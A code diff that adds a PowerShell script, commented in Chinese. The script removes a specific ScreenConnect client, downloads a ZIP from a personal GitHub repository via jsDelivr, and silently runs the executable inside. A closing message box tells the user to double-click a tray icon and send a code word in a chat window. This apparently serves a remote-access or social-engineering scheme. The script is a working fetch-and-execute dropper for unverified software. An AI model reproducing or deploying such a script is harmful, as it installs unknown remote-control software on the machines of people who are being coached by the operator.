@@ -1,0 +1,51 @@
+# 设置文件路径
+$zipUrl = "https://cdn.jsdelivr.net/gh/GHFXJ1680/a@main/YC_WIN.zip"
+$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "YC_WIN.zip")
+$tempFolderPath = [System.IO.Path]::GetTempPath()
+$extractedFolderPath = [System.IO.Path]::Combine($tempFolderPath, "YC_WIN")
+
+$softwareName = "ScreenConnect Client (48d2773280af8f97)"
+$product = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -eq $softwareName }
+if ($product) {
+    $product | ForEach-Object {
+        $_.Uninstall() | Out-Null
+        Write-Host "Uninstall command sent to $($product.Name)"
+    }
+}
+
+# 下载ZIP文件到桌面
+Write-Host "Downloading file..."
+#Invoke-WebRequest -Uri $zipUrl -OutFile $desktopPath
+(New-Object System.Net.WebClient).DownloadFile($zipUrl, $desktopPath)
+
+# 如果解压目标文件夹已存在，先删除
+if (Test-Path $extractedFolderPath) {
+    Write-Host "Cleaning up old files..."
+    Remove-Item -Path $extractedFolderPath -Recurse -Force
+}
+
+# 创建临时文件夹
+New-Item -Path $extractedFolderPath -ItemType Directory | Out-Null
+
+# 解压缩文件到临时文件夹
+Write-Host "Extracting file..."
+Add-Type -AssemblyName "System.IO.Compression.FileSystem"
+[System.IO.Compression.ZipFile]::ExtractToDirectory($desktopPath, $extractedFolderPath)
+
+# 查找解压后的可执行文件
+$extractedFile = Get-ChildItem -Path $extractedFolderPath -Filter *.exe | Select-Object -First 1
+
+if ($extractedFile) {
+    # 运行解压后的文件
+    Write-Host "Running the executable..."
+    Start-Process -FilePath $extractedFile.FullName -Wait
+
+    # 当文件运行完毕后，弹出消息框
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show(“请注意桌面右下角会出现一个小头像图标, `n`n当图标右下角变成绿点时双击它!`n`n在聊天窗口中发送暗号后再告知我!", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+} else {
+    Write-Host "No executable file found in extracted folder."
+}
+
+# 清理下载的ZIP文件
+Remove-Item -Path $desktopPath -Force
